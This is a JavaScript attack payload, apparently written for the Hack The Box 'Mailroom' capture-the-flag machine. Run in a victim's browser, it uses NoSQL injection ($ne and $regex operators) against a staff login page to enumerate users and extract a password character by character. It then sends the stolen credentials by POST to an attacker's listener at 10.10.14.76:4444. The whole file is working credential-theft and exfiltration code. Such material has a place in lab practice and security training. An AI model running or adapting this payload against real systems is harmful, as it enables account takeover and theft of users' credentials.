const IP = "10.10.14.76"
const PORT = 4444

async function sendResponse(resp) {
    fetch(`http://${IP}:${PORT}`, {method: "POST", body: resp});
}

async function testEmail() {
    var users = ["administrator", "matthew", "tristan"];
    for(var user of users) {
        email = `${user}@mailroom.htb`
        payload = `email=${email}&password[$ne]=bar`
        response = await attemptLogin(payload);
        if(response.includes("Check your inbox")) {
            return email;
        }
    }
    return "Not found";
}

function getCharactersList() {
    var lowercase = "abcdefghijklmnopqrstuvwxyz";
    var uppercase = lowercase.toUpperCase();
    var special = "!%#_-"
    var numbers = "0123456789"
    var all = lowercase + uppercase + special + numbers;
    return all.split("");
}
const characters = getCharactersList();

async function findPassword(email) {
    var password = "";
    while(true) {
        var foundChar = false;
        for(let character of characters) {
            var attempt = password + character;
            var payload = `email=${email}&password[$regex]=^${attempt}`;

            var response = await attemptLogin(payload);
            if(response.includes("Check your inbox")) {
                password = attempt;
                foundChar = true;
                break;
            }
        }
        if(!foundChar) {
            break;
        }
    }
    return password;
}

async function attemptLogin(data) {
    var request = new XMLHttpRequest();
    request.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", false);
    request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    request.send(data);

    return request.responseText;
}

async function main() {
    var email = await testEmail();
    var password = await findPassword(email);
    return {email: email, password: password};
}

try {
    main().then(result => {
        sendResponse(JSON.stringify(result));
    });
} catch(err) {
    sendResponse(err);
}
